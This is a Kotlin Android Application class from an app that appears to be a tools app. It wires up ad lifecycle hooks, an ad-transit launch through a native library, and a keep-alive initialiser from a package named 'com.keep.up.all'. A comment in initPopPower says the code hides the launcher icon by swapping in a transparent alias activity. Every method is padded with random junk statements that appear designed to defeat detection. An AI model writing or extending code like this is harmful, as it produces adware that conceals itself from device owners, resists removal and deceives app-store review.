package thg.zzcjg.nnvmr

import android.app.Application
import android.content.Intent
import android.os.Bundle
import thg.zzcjg.nnvmr.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import thg.nvx.urmj.ad.runtime.AdLifecycleInstaller
import thg.nvx.urmj.base.APPContext
import thg.nvx.urmj.base.OverseaAppHost
import thg.nvx.urmj.base.OverseaAppInitializer


class TWQD : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: TWQD? = null
    }

    override fun onCreate() {
        val PpqoObCzs : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val lxbCcjnkxGjWx  = PpqoObCzs ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_14" 
            }
            if (lxbCcjnkxGjWx .startsWith("nGirOQxs ")) {
                android.util.Log.v("TAG", lxbCcjnkxGjWx )
            }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val ugErFO : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val cmLUbpTLQUbJmKc  = ugErFO ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_28" 
            }
            if (cmLUbpTLQUbJmKc .startsWith("LuijEgSrAIjQRmD ")) {
                android.util.Log.v("TAG", cmLUbpTLQUbJmKc )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_AKeGYsmLGN = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_HHDkyLOWq  = (arr_AKeGYsmLGN  shl 39) xor (arr_AKeGYsmLGN  shr 30)
         val j_FGWlYkbRgetQawPY  = i_HHDkyLOWq .inv() and 0xFFFF
         if (j_FGWlYkbRgetQawPY  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_AurQcLHRe")
         }
        XQLM.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_ATRtWFtOPARUbs = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_jvnaZ  = (arr_ATRtWFtOPARUbs  shl 19) xor (arr_ATRtWFtOPARUbs  shr 94)
         val j_pWvJxdhBml  = i_jvnaZ .inv() and 0xFFFF
         if (j_pWvJxdhBml  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_eselurIbbDhXZrGS")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val ohdTGybmmzH : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val IGOqoLBu  = ohdTGybmmzH ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_11" 
            }
            if (IGOqoLBu .startsWith("cSyjsvNPwG ")) {
                android.util.Log.v("TAG", IGOqoLBu )
            }
        // 启动图标隐藏：禁用 VECW 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, XQJT::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }


    override fun initKeepPower(app: Application) {
        val arr_milBOly  = listOf("AZGkPaCJuYSaRMjC", "BoNJJQmEuMgqMddvf", "JCNnqxkPMpcgJHygKqM").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_TztkBAUxeSQQTkJkChx  = arr_milBOly .filter { it.length > 95 }
         if (ad_TztkBAUxeSQQTkJkChx .isNotEmpty() && java.lang.System.currentTimeMillis() < 54) {
             ad_TztkBAUxeSQQTkJkChx .forEach { _ ->  }
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}